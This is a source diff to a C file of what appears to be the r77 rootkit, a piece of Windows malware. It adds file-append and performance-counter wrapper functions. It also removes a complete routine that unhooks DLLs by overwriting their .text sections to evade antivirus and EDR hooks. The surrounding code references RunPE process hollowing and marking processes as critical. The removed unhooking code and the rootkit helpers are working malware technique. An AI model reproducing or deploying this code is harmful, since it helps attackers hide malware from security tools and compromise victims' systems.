@@ -1,5 +1,4 @@
 #include "r77win.h"
-#include "ntdll.h"
 #include <Psapi.h>
 #include <Shlwapi.h>
 #include <aclapi.h>
@@ -74,34 +73,39 @@ LPWSTR ConvertUnicodeStringToString(UNICODE_STRING str)
 		return NULL;
 	}
 }
-VOID Int32ToStrW(LONG value, PWCHAR buffer)
+PWCHAR Int32ToStrW(LONG value, PWCHAR buffer)
 {
+	PWCHAR returnValue = buffer;
+
 	if (value == 0)
 	{
 		buffer[0] = L'0';
 		buffer[1] = L'\0';
-		return;
 	}
-
-	if (value < 0)
+	else
 	{
-		*buffer++ = L'-';
-		value = -value;
+		if (value < 0)
+		{
+			*buffer++ = L'-';
+			value = -value;
+		}
+
+		INT length = 0;
+		for (LONG i = value; i; i /= 10)
+		{
+			length++;
+		}
+
+		for (INT i = 0; i < length; i++)
+		{
+			buffer[length - i - 1] = L'0' + value % 10;
+			value /= 10;
+		}
+
+		buffer[length] = L'\0';
 	}
 
-	INT length = 0;
-	for (LONG i = value; i; i /= 10)
-	{
-		length++;
-	}
-
-	for (INT i = 0; i < length; i++)
-	{
-		buffer[length - i - 1] = L'0' + value % 10;
-		value /= 10;
-	}
-
-	buffer[length] = L'\0';
+	return returnValue;
 }
 
 BOOL Is64BitOperatingSystem()
@@ -380,6 +384,20 @@ BOOL WriteFileContent(LPCWSTR path, LPBYTE data, DWORD size)
 	BOOL result = FALSE;
 
 	HANDLE file = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (file != INVALID_HANDLE_VALUE)
+	{
+		DWORD bytesWritten;
+		result = WriteFile(file, data, size, &bytesWritten, NULL);
+		CloseHandle(file);
+	}
+
+	return result;
+}
+BOOL AppendFileContent(LPCWSTR path, LPBYTE data, DWORD size)
+{
+	BOOL result = FALSE;
+
+	HANDLE file = CreateFileW(path, FILE_GENERIC_READ | FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (file != INVALID_HANDLE_VALUE)
 	{
 		DWORD bytesWritten;
@@ -731,7 +749,6 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 		if (!isPayload64Bit && BITNESS(64) && !IsAtLeastWindows10())
 		{
 			// Wow64 RunPE requires at least Windows 10.
-			//TODO: Custom implementation for Wow64GetThreadContext and Wow64SetThreadContext required to work on Windows 7.
 			return FALSE;
 		}
 	}
@@ -987,69 +1004,6 @@ DWORD RvaToOffset(LPBYTE image, DWORD rva)
 		return 0;
 	}
 }
-VOID UnhookDll(LPCWSTR name)
-{
-	if (name)
-	{
-		WCHAR path[MAX_PATH + 1];
-		if (Is64BitOperatingSystem() && BITNESS(32)) StrCpyW(path, L"C:\\Windows\\SysWOW64\\");
-		else StrCpyW(path, L"C:\\Windows\\System32\\");
-
-		StrCatW(path, name);
-
-		// Get original DLL handle. This DLL is possibly hooked by AV/EDR solutions.
-		HMODULE dll = GetModuleHandleW(name);
-		if (dll)
-		{
-			MODULEINFO moduleInfo;
-			i_memset(&moduleInfo, 0, sizeof(MODULEINFO));
-
-			if (GetModuleInformation(GetCurrentProcess(), dll, &moduleInfo, sizeof(MODULEINFO)))
-			{
-				// Retrieve a clean copy of the DLL file.
-				HANDLE dllFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-				if (dllFile != INVALID_HANDLE_VALUE)
-				{
-					// Map the clean DLL into memory
-					HANDLE dllMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
-					if (dllMapping)
-					{
-						LPVOID dllMappedFile = MapViewOfFile(dllMapping, FILE_MAP_READ, 0, 0, 0);
-						if (dllMappedFile)
-						{
-							PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)moduleInfo.lpBaseOfDll + ((PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll)->e_lfanew);
-
-							for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
-							{
-								PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * (ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER));
-
-								// Find the .text section of the hooked DLL and overwrite it with the original DLL section
-								if (!StrCmpIA((LPCSTR)sectionHeader->Name, ".text"))
-								{
-									LPVOID virtualAddress = (LPVOID)((ULONG_PTR)moduleInfo.lpBaseOfDll + (ULONG_PTR)sectionHeader->VirtualAddress);
-									DWORD virtualSize = sectionHeader->Misc.VirtualSize;
-
-									DWORD oldProtect;
-									VirtualProtect(virtualAddress, virtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
-									i_memcpy(virtualAddress, (LPVOID)((ULONG_PTR)dllMappedFile + (ULONG_PTR)sectionHeader->VirtualAddress), virtualSize);
-									VirtualProtect(virtualAddress, virtualSize, oldProtect, &oldProtect);
-
-									break;
-								}
-							}
-						}
-
-						CloseHandle(dllMapping);
-					}
-
-					CloseHandle(dllFile);
-				}
-			}
-
-			FreeLibrary(dll);
-		}
-	}
-}
 
 NTSTATUS NTAPI R77_NtQueryObject(HANDLE handle, OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength)
 {
@@ -1077,4 +1031,8 @@ NTSTATUS NTAPI R77_RtlAdjustPrivilege(ULONG privilege, BOOLEAN enablePrivilege, 
 NTSTATUS NTAPI R77_RtlSetProcessIsCritical(BOOLEAN newIsCritical, PBOOLEAN oldIsCritical, BOOLEAN needScb)
 {
 	return ((NT_RTLSETPROCESSISCRITICAL)GetFunction("ntdll.dll", "RtlSetProcessIsCritical"))(newIsCritical, oldIsCritical, needScb);
+}
+PDH_STATUS WINAPI R77_PdhGetCounterInfoW(PDH_HCOUNTER counter, BOOLEAN retrieveExplainText, LPDWORD bufferSize, PNT_PDH_COUNTER_INFO_W buffer)
+{
+	return ((NT_PDHGETCOUNTERINFOW)GetFunction("pdh.dll", "PdhGetCounterInfoW"))(counter, retrieveExplainText, bufferSize, buffer);
 }
